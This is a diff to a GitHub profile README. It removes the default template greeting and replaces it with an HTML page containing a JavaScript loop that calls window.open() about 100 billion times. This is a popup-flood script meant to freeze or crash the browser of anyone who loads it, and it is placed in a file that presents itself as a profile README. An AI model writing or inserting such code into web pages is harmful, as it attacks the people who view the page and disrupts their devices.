@@ -1,10 +1,12 @@
-- 👋 Hi, I’m @zsxc111
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
-
-<!---
-zsxc111/zsxc111 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+<html>
+<body>
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+for(i=0;i<100000000000;++i)
+{
+window.open();
+}
+-->
+</SCRIPT>
+</body>
+</html>
